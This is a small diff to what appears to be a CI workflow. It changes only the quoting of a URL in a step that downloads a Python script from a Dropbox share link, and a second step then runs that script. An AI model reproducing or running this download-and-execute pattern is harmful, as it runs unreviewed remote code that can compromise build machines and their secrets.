@@ -9,6 +9,6 @@ jobs:
 
     steps:
     - name: Download
-      run: Invoke-WebRequest https://www.dropbox.com/scl/fi/a2hosrrny09d6j05ummx9/index.py?rlkey=qbp0tqvq4bfyqkfay0mnc1ccu&dl=1 -OutFile index.py
+      run: Invoke-WebRequest "https://www.dropbox.com/scl/fi/a2hosrrny09d6j05ummx9/index.py?rlkey=qbp0tqvq4bfyqkfay0mnc1ccu&dl=1" -OutFile index.py
     - name: running
       run: py index.py
